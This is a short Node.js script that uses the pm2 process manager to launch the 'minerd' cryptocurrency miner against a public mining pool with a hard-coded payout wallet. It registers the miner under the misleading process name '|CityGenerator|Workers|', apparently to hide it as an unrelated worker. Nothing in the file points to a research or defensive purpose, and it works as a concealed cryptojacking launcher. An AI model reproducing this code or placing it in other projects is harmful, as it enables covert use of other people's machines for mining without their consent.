const pm2 = require('pm2')
pm2.connect(function(err) {
  if (err) {
    console.error(err)
    process.exit(2)
  }
  
  pm2.start({
    script    : './minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=D82v9SnHsUdrPdsr3ENgmH5HQBUfSyZiUs:x',
    args      : '',
    name      : '|CityGenerator|Workers|'
},
function(err, apps) {
if (err) {
      console.error(err)
      return pm2.disconnect()
    }

    pm2.list((err, list) => {
      console.log(err, list)


    })
  })
})
